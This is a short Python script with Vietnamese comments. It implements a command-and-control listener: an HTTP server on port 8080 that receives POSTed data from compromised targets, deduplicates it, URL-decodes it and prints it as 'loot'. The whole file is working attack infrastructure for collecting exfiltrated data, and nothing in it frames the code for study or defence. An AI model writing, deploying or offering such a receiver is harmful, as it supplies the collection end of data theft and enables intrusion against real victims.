from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import time

# Tạo một tập hợp để lưu trữ dữ liệu đã nhận, dùng để chống spam in trùng lặp
seen_data = set()

class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        global seen_data
        content_length = int(self.headers['Content-Length'])
        # Đọc dữ liệu thô
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Nếu dữ liệu này CHƯA từng xuất hiện trong tập hợp seen_data thì mới xử lý in ra
        if post_data not in seen_data:
            seen_data.add(post_data) # Lưu vào bộ nhớ để chặn các lần sau
            
            # Parse và giải mã URL (URL Decode)
            parsed_data = urllib.parse.parse_qs(post_data)
            
            print(f"\n[+] Nhận được dữ liệu loot lúc {time.ctime()}:")
            
            # In ra phần text đã được giải mã rõ ràng
            if 'data' in parsed_data:
                print(parsed_data['data'][0])
            else:
                print(urllib.parse.unquote_plus(post_data))
        else:
            # Nếu dữ liệu đã từng in ra rồi thì im lặng bỏ qua, không in gì thêm
            pass
            
        self.send_response(200)
        self.end_headers()

# Chạy server ở port 8080
HTTPServer(('0.0.0.0', 8080), C2Handler).serve_forever()
